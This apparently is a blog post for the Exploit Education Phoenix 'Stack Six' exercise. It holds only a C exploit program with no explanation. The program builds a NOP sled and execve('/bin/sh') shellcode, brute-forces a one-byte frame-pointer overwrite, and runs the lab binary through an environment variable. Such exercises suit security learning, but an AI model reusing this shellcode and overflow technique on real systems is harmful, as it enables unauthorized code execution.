---
layout: post
title: Phoenix Stack Six
---

```c
#include <unistd.h>
#include <sys/wait.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>

#define PAYLOAD_SIZE 127

#define OFFSET_SIZE 5

//22 bytes shellcode
unsigned char shellcode[] = 
"\x48\x31\xf6\x56\x48\xbf"
"\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68\x57\x54"
"\x5f\xb0\x3b\x99\x0f\x05";


const char GREET[] = "Welcome, I am pleased to meet you ";

int main()
{
	char ExploitEducation[PAYLOAD_SIZE+1]; //+1 for null termination

	//Payload Generation	
	int nop_sled_index;
	for(nop_sled_index = 0; nop_sled_index < 80; ++nop_sled_index)
		ExploitEducation[nop_sled_index] = '\x90';

	char *shellcode_pos = ExploitEducation+nop_sled_index;
	memcpy(ExploitEducation+nop_sled_index, shellcode, strlen(shellcode));

	unsigned char ebp_lsb = '\xb0';

	for(int offset = -10; offset <= 10; ++offset)
	{
		for(unsigned int ebp_lsb_index = nop_sled_index + strlen(shellcode);
				ebp_lsb_index < PAYLOAD_SIZE;
				++ebp_lsb_index)
		{
			ExploitEducation[ebp_lsb_index] = ebp_lsb+offset*8;
		}

		ExploitEducation[PAYLOAD_SIZE] = '\0';
		setenv("ExploitEducation", ExploitEducation, 1);
		printf("EBP LSB: %02hhx\n", ebp_lsb+offset*8);
		system("/opt/phoenix/amd64/stack-six");
	}


	setenv("ExploitEducation", ExploitEducation, 1);
	printf("%s", ExploitEducation);
}

```

